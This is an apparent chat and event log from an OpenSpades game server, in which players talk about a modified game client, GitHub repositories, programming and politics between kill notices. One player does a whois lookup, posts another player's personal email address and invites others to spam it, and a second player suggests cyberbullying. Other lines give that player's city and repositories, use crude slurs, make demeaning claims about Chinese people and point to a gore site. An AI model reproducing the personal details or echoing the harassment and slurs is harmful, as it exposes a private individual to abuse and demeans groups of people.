Thu Sep 25 23:32:41 2025 ------ World Loaded ------
Thu Sep 25 23:32:41 2025 Welcome to aloha.pk tower of babel
Thu Sep 25 23:32:43 2025 Map: Goonassault Japan by Lostmotel
Thu Sep 25 23:32:45 2025 Game mode: babel
Thu Sep 25 23:32:47 2025 Build a tower to get the enemy's intel. Take it to your team's tent to win!
Thu Sep 25 23:32:48 2025 [Global] Jamal (Blue): What's going on with the server today?
Thu Sep 25 23:32:49 2025 Visit our community forum at https://aloha.pk/
Thu Sep 25 23:32:51 2025 Come chat with us at https://discord.aloha.pk/
Thu Sep 25 23:32:53 2025 [Global] not a burner (): lag
Thu Sep 25 23:32:56 2025 [Global] ATORRES_BR! (Red): YAH
Thu Sep 25 23:32:56 2025 [Global] Jamal (Blue): ATORRESito!!!
Thu Sep 25 23:32:58 2025 [Global] ATORRES_BR! (Red): a lot 
Thu Sep 25 23:33:00 2025 [Global] ATORRES_BR! (Red): why ?
Thu Sep 25 23:33:04 2025 [Global] ATORRES_BR! (Red): JAMALITO BRU 
Thu Sep 25 23:33:05 2025 [Global] not a burner (): lag
Thu Sep 25 23:33:12 2025 [Global] ATORRES_BR! (Red): O NOH !, BURBER are here
Thu Sep 25 23:33:25 2025  Use /HEAVEN to paint the babel platform!
Thu Sep 25 23:33:26 2025 Jamal (Blue) [SMG] ATORRES_BR! (Red)
Thu Sep 25 23:33:27 2025 [Global] ATORRES_BR! (Red): pleasem song the pepppa pig song to him sleep
Thu Sep 25 23:33:35 2025 [Global] ATORRES_BR! (Red): O NOH !, BURBER are here
Thu Sep 25 23:33:46 2025 [Global] ATORRES_BR! (Red): GO to bed Burber
Thu Sep 25 23:33:51 2025 [Global] not a burner (): atorres, i want to see your ~/.local/share/openspades/Resources (for science)
Thu Sep 25 23:34:16 2025 [Global] ATORRES_BR! (Red): yes, testing nre client
Thu Sep 25 23:34:25 2025  Get a 20 killstreak and 1 intel capture(s) to unlock /APOC!
Thu Sep 25 23:34:37 2025 [Global] ATORRES_BR! (Red): is a erros to my custom weapons
Thu Sep 25 23:35:19 2025 [Global] ATORRES_BR! (Red): now im testing a script thats change automaticaly the icon to client
Thu Sep 25 23:35:25 2025  Capture your team's 5th intel to unlock /APOC for your team's best builder!
Thu Sep 25 23:35:28 2025 [Global] not a burner (): why would you need that
Thu Sep 25 23:35:33 2025 [Global] ATORRES_BR! (Red): old codes, many problems
Thu Sep 25 23:35:45 2025 [Global] Jamal (Blue): Are you a hacker ATORRES?
Thu Sep 25 23:35:57 2025 [Global] not a burner (): (no)
Thu Sep 25 23:36:13 2025 [Global] ATORRES_BR! (Red): becouse i want all need make you own sopa spades
Thu Sep 25 23:36:17 2025 [Global] Jamal (Blue): You mean print ("no")?
Thu Sep 25 23:36:25 2025  Mahalo for playing aloha.pk tower of babel
Thu Sep 25 23:36:25 2025 [Global] not a burner (): false
Thu Sep 25 23:36:40 2025 [Global] ATORRES_BR! (Red): for this reason i have created scripts to change all client for a any own pourpose
Thu Sep 25 23:36:45 2025 [Global] ATORRES_BR! (Red): e.g
Thu Sep 25 23:36:50 2025 [Global] ATORRES_BR! (Red): i need JAMAL SPADES
Thu Sep 25 23:37:19 2025 [Global] Jamal (Blue): @ATORRES and not a burner, I wish I was an elite hacker/programmer like you guys :(
Thu Sep 25 23:37:19 2025 [Global] ATORRES_BR! (Red): just type JAMAL on terminal and all cliente will be buitled with this name JAMAL SPADES
Thu Sep 25 23:37:25 2025  Build a tower to get the enemy's intel. Take it to your team's tent to win!
Thu Sep 25 23:37:36 2025 [Global] not a burner (): you consider atorres a hacker?
Thu Sep 25 23:37:50 2025 [Global] Jamal (Blue): I don't know
Thu Sep 25 23:37:55 2025 [Global] ATORRES_BR! (Red): JAMAL SPADES, with JAMAL icon, with JAMAL WEAPONS from GAME BANANA, etc
Thu Sep 25 23:38:07 2025 [Global] ATORRES_BR! (Red): i will work on windows version too
Thu Sep 25 23:38:08 2025 [Global] not a burner (): it seems he's barely just figured out how to use sed(?)
Thu Sep 25 23:38:10 2025 [Global] Jamal (Blue): I think I remember he told me he worked in tech
Thu Sep 25 23:38:14 2025 [Global] ATORRES_BR! (Red):  btu not on now
Thu Sep 25 23:38:21 2025 [Global] not a burner (): he has some wordpress something i thougth
Thu Sep 25 23:38:25 2025  Type /HELP for info & commands
Thu Sep 25 23:38:26 2025 [Global] ATORRES_BR! (Red): now im owrking on chrome extension ( sopa extension )
Thu Sep 25 23:38:32 2025 [Global] not a burner (): torres digital
Thu Sep 25 23:38:38 2025 [Global] ATORRES_BR! (Red): yah, too
Thu Sep 25 23:38:52 2025 [Global] Jamal (Blue): ATORRES is the most dangerous hacker in Brazil
Thu Sep 25 23:38:52 2025 [Global] not a burner (): https://torresdigital.com.br/
Thu Sep 25 23:38:54 2025 [Global] ATORRES_BR! (Red): torres digital is to work with e-commerce ( php )
Thu Sep 25 23:39:00 2025 [Team] ATORRES_BR! (Red): yes <3
Thu Sep 25 23:39:10 2025 [Global] Jamal (Blue): Facebook is written in PHP
Thu Sep 25 23:39:20 2025 [Global] ATORRES_BR! (Red): facebook sucks
Thu Sep 25 23:39:25 2025  Visit our community forums at https://aloha.pk/
Thu Sep 25 23:39:25 2025 [Global] Jamal (Blue): @ATORRES, Hack facebook
Thu Sep 25 23:39:27 2025 [Global] not a burner (): well yes
Thu Sep 25 23:39:29 2025 [Global] ATORRES_BR! (Red): all world are builted on php
Thu Sep 25 23:39:33 2025 TokenSpark joined Blue team
Thu Sep 25 23:39:37 2025 [Global] ATORRES_BR! (Red): shemales are builted on php
Thu Sep 25 23:39:44 2025 [Global] ATORRES_BR! (Red): xD
Thu Sep 25 23:39:46 2025 [Global] not a burner (): except for the part of the world that doesn't use php
Thu Sep 25 23:39:48 2025 ElHarry joined Red team
Thu Sep 25 23:39:56 2025 [Global] ATORRES_BR! (Red): o yah
Thu Sep 25 23:40:00 2025 [Global] Jamal (Blue): @ATORRES, Do you know how to code in C?
Thu Sep 25 23:40:06 2025 [Global] ATORRES_BR! (Red): you paypal account use php
Thu Sep 25 23:40:06 2025 ElHarry (Red) [Rifle] TokenSpark (Blue)
Thu Sep 25 23:40:11 2025 [Global] not a burner (): what paypal account
Thu Sep 25 23:40:16 2025 ElHarry (Red) [Headshot] Jamal (Blue)
Thu Sep 25 23:40:24 2025 [Global] ATORRES_BR! (Red): yah, i lobes C
Thu Sep 25 23:40:25 2025  Come chat with us at https://discord.aloha.pk/
Thu Sep 25 23:40:51 2025 [Global] ATORRES_BR! (Red): this client im using, are  a test
Thu Sep 25 23:40:51 2025 ElHarry (Red) [Headshot] TokenSpark (Blue)
Thu Sep 25 23:41:14 2025 [Global] ATORRES_BR! (Red): i have many days to fix some stuffs on client
Thu Sep 25 23:41:14 2025 [Global] Jamal (Blue): I'm learning Python just to get into programming as a beginner
Thu Sep 25 23:41:25 2025  If you believe a player is breaking the rules, please let us know with /ADMIN
Thu Sep 25 23:41:27 2025 [Global] Jamal (Blue): I'll see how it goes and then maybe learn C or Rust
Thu Sep 25 23:41:44 2025 ElHarry (Red) [Headshot] TokenSpark (Blue)
Thu Sep 25 23:41:45 2025 [Global] ATORRES_BR! (Red): yah., but begins with PORTUGOL
Thu Sep 25 23:41:51 2025 Jamal (Blue) [Headshot] ElHarry (Red)
Thu Sep 25 23:42:03 2025 [Global] not a burner (): i was bored so i did a whois on atorres's domain
Thu Sep 25 23:42:12 2025 [Global] not a burner (): anyone want to spam atorres' email?
Thu Sep 25 23:42:12 2025 ElHarry (Red) [Grenade] Jamal (Blue)
Thu Sep 25 23:42:14 2025 [Global] not a burner (): e-mail:      atorresnh@gmail.com
Thu Sep 25 23:42:20 2025 ElHarry (Red) [Headshot] TokenSpark (Blue)
Thu Sep 25 23:42:22 2025 [Global] Deuce (): lol
Thu Sep 25 23:42:25 2025  This server runs imger and glow. Use /IMG or /GLOW to toggle them.
Thu Sep 25 23:42:27 2025 [Global] Jamal (Blue): Cyberbully him?
Thu Sep 25 23:42:32 2025 [Global] not a burner (): for some reason he doesn't have domain privacy
Thu Sep 25 23:42:35 2025  20 minutes remaining.
Thu Sep 25 23:42:43 2025 [Team] ATORRES_BR! (Red): yes, want <3
Thu Sep 25 23:43:10 2025 [Global] ATORRES_BR! (Red): why person like a dtank and lot a burber have affrayd from internet ?
Thu Sep 25 23:43:16 2025 [Global] ATORRES_BR! (Red): trump ?
Thu Sep 25 23:43:19 2025 ATORRES_BR! (Red) [Headshot] Jamal (Blue)
Thu Sep 25 23:43:23 2025 [Global] not a burner (): i have an affrayd?
Thu Sep 25 23:43:25 2025  Use /EMOTE to draw an emote on the map!
Thu Sep 25 23:43:27 2025 [Global] not a burner (): it came from the internet?
Thu Sep 25 23:43:32 2025 [Global] Jamal (Blue): Donald Trump is Epstein's best friend
Thu Sep 25 23:43:37 2025 ElHarry (Red) [Headshot] TokenSpark (Blue)
Thu Sep 25 23:43:50 2025 [Global] ATORRES_BR! (Red): americans and cannadians and uks persons have afrayd for trump
Thu Sep 25 23:43:53 2025 [Global] ATORRES_BR! (Red): xD LOL
Thu Sep 25 23:44:08 2025 [Global] not a burner (): by the way, why does atorres have 3 or 4 different repositories for sopaspades
Thu Sep 25 23:44:18 2025 [Global] ATORRES_BR! (Red): testes
Thu Sep 25 23:44:18 2025 ElHarry (Red) [Headshot] TokenSpark (Blue)
Thu Sep 25 23:44:21 2025 Player TokenSpark has left
Thu Sep 25 23:44:22 2025 [Global] ATORRES_BR! (Red): tests
Thu Sep 25 23:44:25 2025  Use /HEAVEN to paint the babel platform!
Thu Sep 25 23:44:27 2025 [Global] Jamal (Blue): @ATORRES and @not a burner,  You both need to team up and hack the US Governement and release the Epstein fi
Thu Sep 25 23:44:31 2025 [Global] not a burner (): https://github.com/atorresbr/sopaspades
Thu Sep 25 23:44:37 2025 [Global] not a burner (): https://github.com/atorresbr/a-la-popa
Thu Sep 25 23:44:41 2025 [Global] not a burner (): https://github.com/torresdigital/a-la-popa
Thu Sep 25 23:44:42 2025 [Global] ATORRES_BR! (Red): i dont use the same, i use others like a backup
Thu Sep 25 23:44:54 2025 [Global] not a burner (): like a backup?
Thu Sep 25 23:44:58 2025 [Global] ATORRES_BR! (Red): i will exclude all
Thu Sep 25 23:45:05 2025 [Global] ATORRES_BR! (Red): yes
Thu Sep 25 23:45:08 2025 [Global] not a burner (): torres, git *is* a backup
Thu Sep 25 23:45:13 2025 [Global] Jamal (Blue): @not a burner, What does this "sopa spades" do?
Thu Sep 25 23:45:17 2025  Y.O.B.A. was kicked: Inactive for 30 minutes
Thu Sep 25 23:45:17 2025 Player Y.O.B.A. has left
Thu Sep 25 23:45:18 2025 [Global] ATORRES_BR! (Red): u dont understand
Thu Sep 25 23:45:19 2025 [Global] not a burner (): it's openspades
Thu Sep 25 23:45:25 2025  Get a 20 killstreak and 1 intel capture(s) to unlock /APOC!
Thu Sep 25 23:45:27 2025 Yotsen joined Blue team
Thu Sep 25 23:45:34 2025 [Global] not a burner (): i don't understand?
Thu Sep 25 23:45:36 2025 Y.O.B.A. joined Spectator team
Thu Sep 25 23:45:37 2025 [Global] Jamal (Blue): Oh, I thought it might be a different client
Thu Sep 25 23:45:42 2025 [Global] ATORRES_BR! (Red): i dont trust on synSpades
Thu Sep 25 23:45:47 2025 [Team] ATORRES_BR! (Red): SOPA are so delicious <3
Thu Sep 25 23:45:53 2025 [Global] Deuce (): i like how atorres attacks the president and people of other countries
Thu Sep 25 23:46:06 2025 [Global] Deuce (): when he lives in a country where people elected a prisoner
Thu Sep 25 23:46:08 2025 [Global] Jamal (Blue): Is there any client better than OpenSpades or Voxlap?
Thu Sep 25 23:46:09 2025 [Global] ATORRES_BR! (Red): for this reason i have others repositories, A B test
Thu Sep 25 23:46:10 2025 [Global] not a burner (): you don't trust synspades?
Thu Sep 25 23:46:20 2025 [Global] not a burner (): but they're all sopaspades?
Thu Sep 25 23:46:23 2025 [Global] ATORRES_BR! (Red): agree Deuce
Thu Sep 25 23:46:25 2025  Capture your team's 5th intel to unlock /APOC for your team's best builder!
Thu Sep 25 23:46:38 2025 [Global] ATORRES_BR! (Red): i lives on Latin America
Thu Sep 25 23:46:50 2025 [Global] ATORRES_BR! (Red): not surprise for you comment
Thu Sep 25 23:47:03 2025 Yotsen (Blue) [Rifle] ATORRES_BR! (Red)
Thu Sep 25 23:47:11 2025 Karnov joined Blue team
Thu Sep 25 23:47:25 2025  Mahalo for playing aloha.pk tower of babel
Thu Sep 25 23:47:26 2025 [Global] ATORRES_BR! (Red): Ok, 23:47 ( 11.47 PM ), IM go to bed <3
Thu Sep 25 23:47:31 2025 ATORRES_BR! (Red) [Headshot] Jamal (Blue)
Thu Sep 25 23:47:32 2025 Aikiboy joined Spectator team
Thu Sep 25 23:47:33 2025 Yotsen (Blue) [Headshot] ATORRES_BR! (Red)
Thu Sep 25 23:47:35 2025  15 minutes remaining.
Thu Sep 25 23:47:45 2025 [Global] ATORRES_BR! (Red): LOT a burber, talk a little about u
Thu Sep 25 23:47:49 2025 [Global] Jamal (Blue): Goodbye everyone, have a great day :)
Thu Sep 25 23:47:52 2025 [Global] ATORRES_BR! (Red): what do u studie ?
Thu Sep 25 23:47:53 2025 [Global] not a burner (): bye jamal
Thu Sep 25 23:47:55 2025 Player Jamal has left
Thu Sep 25 23:47:58 2025 [Global] not a burner (): what do i studie?
Thu Sep 25 23:47:59 2025 [Global] ATORRES_BR! (Red): age ?
Thu Sep 25 23:48:03 2025 [Global] not a burner (): 65
Thu Sep 25 23:48:08 2025 [Global] ATORRES_BR! (Red): lier
Thu Sep 25 23:48:13 2025 [Global] not a burner (): 66
Thu Sep 25 23:48:23 2025 [Global] not a burner (): i look young for my age, don't i?
Thu Sep 25 23:48:25 2025  Build a tower to get the enemy's intel. Take it to your team's tent to win!
Thu Sep 25 23:48:30 2025 [Global] ATORRES_BR! (Red): american citizen have afrayd from the internet xD
Thu Sep 25 23:48:30 2025 [Global] not a burner (): i'm actually 177
Thu Sep 25 23:48:34 2025 Yotsen (Blue) [Melee] ATORRES_BR! (Red)
Thu Sep 25 23:48:40 2025 ATORRES_BR! (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:49:00 2025 [Global] ATORRES_BR! (Red): i see some countries like a china communism
Thu Sep 25 23:49:11 2025 [Global] ATORRES_BR! (Red): cams for every places
Thu Sep 25 23:49:17 2025 Yotsen (Blue) [Melee] ATORRES_BR! (Red)
Thu Sep 25 23:49:20 2025 Player Yotsen has left
Thu Sep 25 23:49:25 2025  Type /HELP for info & commands
Thu Sep 25 23:49:35 2025 [Global] ATORRES_BR! (Red): the gov watch all social networks
Thu Sep 25 23:49:35 2025 [Global] Deuce (): communist china, the most capitalist country
Thu Sep 25 23:49:39 2025 [Global] ATORRES_BR! (Red): theses stuffs
Thu Sep 25 23:49:40 2025 Karnov (Blue) [Headshot] ATORRES_BR! (Red)
Thu Sep 25 23:50:13 2025 [Global] not a burner (): by the way has atorres heard of this thing called a branch
Thu Sep 25 23:50:17 2025 Karnov (Blue) [Headshot] ATORRES_BR! (Red)
Thu Sep 25 23:50:23 2025 [Global] ATORRES_BR! (Red): NAH, communist, BUT lobes money like u
Thu Sep 25 23:50:25 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:50:25 2025  Visit our community forums at https://aloha.pk/
Thu Sep 25 23:50:59 2025 [Global] ATORRES_BR! (Red): people in china dont have live
Thu Sep 25 23:51:15 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:51:17 2025 [Global] ATORRES_BR! (Red): suicide is the culture between the persons on this BULSHIT place
Thu Sep 25 23:51:25 2025  Come chat with us at https://discord.aloha.pk/
Thu Sep 25 23:52:03 2025 ElHarry (Red) [Rifle] Karnov (Blue)
Thu Sep 25 23:52:09 2025 [Global] ATORRES_BR! (Red): google an site called ATROCIDADES 18 . NET and see many china videos 
Thu Sep 25 23:52:17 2025 Player Y.O.B.A. has left
Thu Sep 25 23:52:24 2025 Aikiboy joined Red team
Thu Sep 25 23:52:25 2025  If you believe a player is breaking the rules, please let us know with /ADMIN
Thu Sep 25 23:52:34 2025 [Global] ATORRES_BR! (Red): IS NOT A PORN site
Thu Sep 25 23:52:35 2025  10 minutes remaining.
Thu Sep 25 23:52:38 2025 [Global] not a burner (): thanks
Thu Sep 25 23:52:43 2025 [Global] ATORRES_BR! (Red): gore
Thu Sep 25 23:52:44 2025 [Global] not a burner (): if not porn, then what
Thu Sep 25 23:52:53 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:52:58 2025 Y.O.B.A. joined Spectator team
Thu Sep 25 23:53:15 2025 [Global] ATORRES_BR! (Red): atrocidades 18 . net is not a x site
Thu Sep 25 23:53:19 2025 ATORRES_BR! (Red) [Rifle] Karnov (Blue)
Thu Sep 25 23:53:25 2025  This server runs imger and glow. Use /IMG or /GLOW to toggle them.
Thu Sep 25 23:53:36 2025 Karnov (Blue) [SMG] ATORRES_BR! (Red)
Thu Sep 25 23:54:02 2025 ATORRES_BR! (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:54:10 2025 Aikiboy picked up Blue's Intel.
Thu Sep 25 23:54:18 2025 Aikiboy dropped Blue's Intel
Thu Sep 25 23:54:18 2025  The intel has returned to the heavens
Thu Sep 25 23:54:18 2025 Aikiboy (Red) [Fall]
Thu Sep 25 23:54:25 2025  Use /EMOTE to draw an emote on the map!
Thu Sep 25 23:55:25 2025  Use /HEAVEN to paint the babel platform!
Thu Sep 25 23:55:33 2025 Karnov (Blue) [Headshot] ElHarry (Red)
Thu Sep 25 23:56:06 2025 Karnov (Blue) [Headshot] ATORRES_BR! (Red)
Thu Sep 25 23:56:09 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:56:10 2025 [Global] ATORRES_BR! (Red): FUUUUUUUU
Thu Sep 25 23:56:25 2025  Get a 20 killstreak and 1 intel capture(s) to unlock /APOC!
Thu Sep 25 23:56:33 2025 [Global] ATORRES_BR! (Red): LOT  a burber is Basrshbellow 
Thu Sep 25 23:56:35 2025 [Team] ATORRES_BR! (Red): t?
Thu Sep 25 23:56:37 2025 [Global] ATORRES_BR! (Red): xD
Thu Sep 25 23:56:39 2025 [Global] not a burner (): atorres is jamal
Thu Sep 25 23:56:41 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:56:51 2025 [Global] ATORRES_BR! (Red): hes say to me is american
Thu Sep 25 23:56:58 2025 [Global] ATORRES_BR! (Red): u are a lier barsh
Thu Sep 25 23:57:03 2025 [Global] not a burner (): ???
Thu Sep 25 23:57:19 2025 Karnov (Blue) [Headshot] ElHarry (Red)
Thu Sep 25 23:57:20 2025 [Global] ATORRES_BR! (Red): Barshbellos is from Marroco
Thu Sep 25 23:57:25 2025  Capture your team's 5th intel to unlock /APOC for your team's best builder!
Thu Sep 25 23:57:31 2025 [Global] ATORRES_BR! (Red): i see u IP burber
Thu Sep 25 23:57:32 2025 [Global] not a burner (): i think atorres is crazy
Thu Sep 25 23:57:35 2025 [Global] not a burner (): what is my IP
Thu Sep 25 23:57:35 2025  5 minutes remaining.
Thu Sep 25 23:57:36 2025 Karnov (Blue) [Headshot] Aikiboy (Red)
Thu Sep 25 23:57:41 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:57:49 2025 [Global] ATORRES_BR! (Red): one friend say to me on pm
Thu Sep 25 23:57:54 2025 [Global] not a burner (): which
Thu Sep 25 23:57:54 2025 [Global] ATORRES_BR! (Red): you are Barshbellow
Thu Sep 25 23:58:04 2025 [Global] ATORRES_BR! (Red): secret
Thu Sep 25 23:58:07 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:58:15 2025 [Global] not a burner (): i think your friend is incorrect
Thu Sep 25 23:58:24 2025 [Global] not a burner (): and i think you do not really have my IP address
Thu Sep 25 23:58:25 2025  Mahalo for playing aloha.pk tower of babel
Thu Sep 25 23:58:25 2025 [Global] ATORRES_BR! (Red): NAH, hes not lie to mee
Thu Sep 25 23:58:30 2025 [Global] Deuce (): i think that the only thing aterros knows is how to take cover in a shootout
Thu Sep 25 23:58:35 2025  4 minutes remaining.
Thu Sep 25 23:58:39 2025 [Global] not a burner (): you don't have to lie to be wrong
Thu Sep 25 23:58:39 2025 [Global] ATORRES_BR! (Red): i dont have u ip adess
Thu Sep 25 23:58:40 2025 [Global] Deuce (): other thing than that, i doubt, cause he still here
Thu Sep 25 23:58:45 2025 [Global] ATORRES_BR! (Red): i have Barshbellow ip adress
Thu Sep 25 23:58:48 2025 [Global] ATORRES_BR! (Red): and u are him
Thu Sep 25 23:58:48 2025 [Global] not a burner (): what's that
Thu Sep 25 23:59:01 2025 ElHarry (Red) [Headshot] Karnov (Blue)
Thu Sep 25 23:59:11 2025 [Global] not a burner (): you say you have not my address, yet you have my address?
Thu Sep 25 23:59:15 2025 [Global] ATORRES_BR! (Red): persons like lot a burber are schizofrenic
Thu Sep 25 23:59:15 2025 Player Karnov has left
Thu Sep 25 23:59:25 2025  Build a tower to get the enemy's intel. Take it to your team's tent to win!
Thu Sep 25 23:59:27 2025 [Global] ATORRES_BR! (Red): have affrayd from internet
Thu Sep 25 23:59:28 2025 [Global] ATORRES_BR! (Red): xD
Thu Sep 25 23:59:31 2025 [Global] not a burner (): peoples like torres are silly
Thu Sep 25 23:59:35 2025  3 minutes remaining.
Thu Sep 25 23:59:38 2025 [Global] ATORRES_BR! (Red): im free
Thu Sep 25 23:59:48 2025 [Global] not a burner (): what from
Thu Sep 25 23:59:49 2025 [Global] ATORRES_BR! (Red): i dont need hide nothing abvout me
Thu Sep 25 23:59:59 2025 [Global] not a burner (): what's your IP address
Fri Sep 26 00:00:10 2025 [Global] ATORRES_BR! (Red): do u now
Fri Sep 26 00:00:14 2025 The Beast joined Blue team
Fri Sep 26 00:00:14 2025 [Global] ATORRES_BR! (Red): same to sopa server
Fri Sep 26 00:00:19 2025 Your ping is 173ms. Lower ping is better!
Fri Sep 26 00:00:23 2025 You can't use this command
Fri Sep 26 00:00:24 2025 [Global] not a burner (): where do you live
Fri Sep 26 00:00:25 2025  Type /HELP for info & commands
Fri Sep 26 00:00:34 2025 [Global] ATORRES_BR! (Red): im live on SANTA MARIA
Fri Sep 26 00:00:35 2025  2 minutes remaining.
Fri Sep 26 00:00:39 2025 [Global] The Beast (Blue): Edmonton, Canada
Fri Sep 26 00:00:39 2025 [Global] ATORRES_BR! (Red): SOUTH OF BRAZIL
Fri Sep 26 00:00:55 2025 [Global] not a burner (): what's inside your ~/.local/share/openspades/Resources
Fri Sep 26 00:00:57 2025 ElHarry (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:01:06 2025 [Global] not a burner (): (folder file)
Fri Sep 26 00:01:14 2025 [Global] ATORRES_BR! (Red): LOT A BURBER knows all about my life, on my github account have my facebook
Fri Sep 26 00:01:23 2025 [Global] ATORRES_BR! (Red): my families, work and scholl is on facebook
Fri Sep 26 00:01:25 2025  Visit our community forums at https://aloha.pk/
Fri Sep 26 00:01:35 2025  60 seconds remaining.
Fri Sep 26 00:01:45 2025 [Global] not a burner (): what is in ~/.local/share/openspades/Resources
Fri Sep 26 00:01:48 2025 [Global] not a burner (): may i see it
Fri Sep 26 00:01:48 2025 ElHarry (Red) [Headshot] The Beast (Blue)
Fri Sep 26 00:01:53 2025 [Global] not a burner (): if you have nothing to hide
Fri Sep 26 00:02:00 2025 [Global] ATORRES_BR! (Red): see on my github repo
Fri Sep 26 00:02:03 2025 [Global] not a burner (): where is
Fri Sep 26 00:02:05 2025  30 seconds remaining.
Fri Sep 26 00:02:10 2025 [Global] ATORRES_BR! (Red): you uindestand about sh scripts
Fri Sep 26 00:02:13 2025 [Global] not a burner (): i cannot find it
Fri Sep 26 00:02:19 2025 [Global] ATORRES_BR! (Red): is my MODERN WAR folder
Fri Sep 26 00:02:25 2025  Come chat with us at https://discord.aloha.pk/
Fri Sep 26 00:02:25 2025  10...
Fri Sep 26 00:02:26 2025  9...
Fri Sep 26 00:02:27 2025 [Global] ATORRES_BR! (Red): with my custom weapons
Fri Sep 26 00:02:27 2025  8...
Fri Sep 26 00:02:28 2025  7...
Fri Sep 26 00:02:29 2025 [Global] not a burner (): MODERN-PACK?
Fri Sep 26 00:02:29 2025  6...
Fri Sep 26 00:02:30 2025  5...
Fri Sep 26 00:02:31 2025 [Global] ATORRES_BR! (Red): OH NORT
Fri Sep 26 00:02:31 2025  4...
Fri Sep 26 00:02:32 2025  3...
Fri Sep 26 00:02:33 2025 ElHarry (Red) [Rifle] The Beast (Blue)
Fri Sep 26 00:02:33 2025  2...
Fri Sep 26 00:02:34 2025 [Global] ATORRES_BR! (Red): YA
Fri Sep 26 00:02:34 2025  1...
Fri Sep 26 00:02:35 2025  Time up! Next map: hezeehills.
Fri Sep 26 00:02:44 2025 ATORRES_BR! (Red) [Fall]
Fri Sep 26 00:02:46 2025 ------ World Unloaded ------
Fri Sep 26 00:02:51 2025 ------ World Loaded ------
Fri Sep 26 00:02:51 2025 not a burner joined Spectator team
Fri Sep 26 00:02:51 2025 Welcome to aloha.pk tower of babel
Fri Sep 26 00:02:52 2025 The Beast joined Blue team
Fri Sep 26 00:02:53 2025 Map: HezeeHills by jojoe
Fri Sep 26 00:02:55 2025 Game mode: babel
Fri Sep 26 00:02:56 2025 [Global] not a burner (): but i cannot see Resources in it
Fri Sep 26 00:02:57 2025 Build a tower to get the enemy's intel. Take it to your team's tent to win!
Fri Sep 26 00:02:59 2025 Deuce joined Spectator team
Fri Sep 26 00:02:59 2025 Visit our community forum at https://aloha.pk/
Fri Sep 26 00:03:00 2025 [Global] not a burner (): it is not there
Fri Sep 26 00:03:01 2025 Come chat with us at https://discord.aloha.pk/
Fri Sep 26 00:03:09 2025 [Global] ATORRES_BR! (Blue): THIS version of cliente uses sopaspades intead openspades
Fri Sep 26 00:03:13 2025 Y.O.B.A. joined Spectator team
Fri Sep 26 00:03:13 2025 Aikiboy joined Red team
Fri Sep 26 00:03:22 2025 [Global] ATORRES_BR! (Blue): for this reason i have a error with modern-war
Fri Sep 26 00:03:22 2025 [Global] not a burner (): may i see your old Resources?
Fri Sep 26 00:03:25 2025  If you believe a player is breaking the rules, please let us know with /ADMIN
Fri Sep 26 00:03:26 2025 [Global] not a burner (): what is
Fri Sep 26 00:03:29 2025 [Global] ATORRES_BR! (Blue): i will fiz on futures
Fri Sep 26 00:04:01 2025 Aikiboy (Red) [Fall]
Fri Sep 26 00:04:07 2025 [Global] ATORRES_BR! (Blue): i have a client modified, all built is on sopaspades instead openspades and synspades
Fri Sep 26 00:04:25 2025  This server runs imger and glow. Use /IMG or /GLOW to toggle them.
Fri Sep 26 00:04:29 2025 [Global] ATORRES_BR! (Blue): i have a sh script to change all entire cliente with a unique sudo
Fri Sep 26 00:04:40 2025 Aikiboy (Red) [Fall]
Fri Sep 26 00:04:54 2025 [Global] ATORRES_BR! (Blue): what is the porpouse ?, teach programing
Fri Sep 26 00:05:04 2025 [Global] not a burner (): has your settings and other things in it
Fri Sep 26 00:05:25 2025  Use /EMOTE to draw an emote on the map!
Fri Sep 26 00:05:28 2025 [Team] ATORRES_BR! (Blue): yes, but this settingsd is to all Debeian derivativies
Fri Sep 26 00:05:49 2025 The Beast (Blue) [Headshot] Aikiboy (Red)
Fri Sep 26 00:05:51 2025 Yotsen joined Red team
Fri Sep 26 00:06:13 2025 [Global] ATORRES_BR! (Blue): the script use the code to install moder on all users home 
Fri Sep 26 00:06:25 2025  Use /HEAVEN to paint the babel platform!
Fri Sep 26 00:06:47 2025 The Beast (Blue) [Fall]
Fri Sep 26 00:06:49 2025 [Global] ATORRES_BR! (Blue): and i dont have a error, i simple dont change the script folders path
Fri Sep 26 00:06:51 2025 The Beast (Blue) [Fall]
Fri Sep 26 00:07:04 2025 [Global] not a burner (): is script folder the one i mentioned?
Fri Sep 26 00:07:18 2025 [Global] ATORRES_BR! (Blue): my priorit is the change all client without errors
Fri Sep 26 00:07:21 2025 Aikiboy (Red) [Fall]
Fri Sep 26 00:07:23 2025 ATORRES_BR! (Blue) [Fall]
Fri Sep 26 00:07:25 2025  Get a 20 killstreak and 1 intel capture(s) to unlock /APOC!
Fri Sep 26 00:07:31 2025 [Global] ATORRES_BR! (Blue): and i have succes makeing this
Fri Sep 26 00:07:51 2025 [Global] ATORRES_BR! (Blue): i change all scripts to make a new icon to cliente, the old methos is erased
Fri Sep 26 00:08:13 2025 Aikiboy (Red) [Fall]
Fri Sep 26 00:08:17 2025 [Global] ATORRES_BR! (Blue): if u need LOTABURBER SPADES, just type on terminal
Fri Sep 26 00:08:24 2025 Yotsen picked up Blue's Intel.
Fri Sep 26 00:08:25 2025  Capture your team's 5th intel to unlock /APOC for your team's best builder!
Fri Sep 26 00:08:38 2025 [Global] ATORRES_BR! (Blue): the script ask wich name u desire to you client
Fri Sep 26 00:09:03 2025 [Global] ATORRES_BR! (Blue): and changes all to folders, scripts, icons, etc
Fri Sep 26 00:09:05 2025 [Global] not a burner (): torres, your sopaspades still makes a directory at ~/.local/share/openspades
Fri Sep 26 00:09:11 2025 [Global] not a burner (): i want to see it
Fri Sep 26 00:09:17 2025 [Global] ATORRES_BR! (Blue): BUT the credits are keep
Fri Sep 26 00:09:25 2025  Mahalo for playing aloha.pk tower of babel
Fri Sep 26 00:09:31 2025 [Global] ATORRES_BR! (Blue): you will see
Fri Sep 26 00:09:39 2025 [Global] not a burner (): i want to see the one you are using
Fri Sep 26 00:09:40 2025 Aikiboy (Red) [Fall]
Fri Sep 26 00:09:48 2025 [Global] ATORRES_BR! (Blue): you want see the code to new script 
Fri Sep 26 00:09:49 2025 [Global] not a burner (): could you upload it to sopaspades github?
